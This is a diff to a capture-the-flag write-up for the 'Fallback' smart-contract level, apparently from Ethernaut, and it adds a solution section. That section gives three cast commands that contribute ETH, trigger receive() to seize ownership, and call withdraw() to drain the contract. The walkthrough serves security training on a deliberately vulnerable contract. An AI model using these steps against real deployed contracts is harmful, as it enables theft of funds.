@@ -1,6 +1,8 @@
 # 1. Fallback 
 
-You will beat this level if 
+**Difficulty : 1/10**
+
+You will beat this level if:
 1. you claim ownership of the contract
 2. you reduce its balance to 0
 
@@ -51,3 +53,23 @@ contract Fallback {
   }
 }
 ```
+
+## Solution
+
+We need to trigger the callback function after having contributed some ETH to become the owner.
+
+Contributing some eth using the "contribute()" function
+```
+cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVATE_KEY
+```
+
+Triggering the fallback function **receive()** by sending a eth transaction with an empty data field
+```
+cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
+```
+
+Draining the contract
+```
+cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
+```
+## Further Reading
